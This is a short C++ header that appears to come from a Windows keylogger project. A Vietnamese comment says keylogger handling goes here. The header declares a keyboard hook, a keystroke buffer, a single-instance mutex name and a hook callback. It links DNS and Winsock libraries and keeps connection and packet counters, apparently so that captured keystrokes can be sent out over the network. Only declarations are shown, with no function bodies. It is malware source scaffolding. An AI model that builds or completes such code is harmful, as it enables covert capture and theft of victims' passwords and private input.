#pragma once
#define WIN32_LEAN_AND_MEAN

// them cac ham xu li keylogger vao day
#include <string>
#include <iomanip>
#include <windows.h>

#pragma comment(lib, "Dnsapi.lib") 
#pragma comment(lib, "Ws2_32.lib") 

#define MAX_BUFFER   5

inline  LPCWSTR      MUTEX_NAME         = L"e3a8bdf7-1c29-4f7b-a0d2-c3f5e9b08a14";
inline  HHOOK        _k_hook;
inline  HKL          keyboardLayout;
inline  std::string  keystrokeBuffer    = "";

inline  int          connectionId       = -1;
inline  int          packetNumber       =  0;

LRESULT __stdcall    process_key(int nCode, WPARAM wParam, LPARAM lParam);
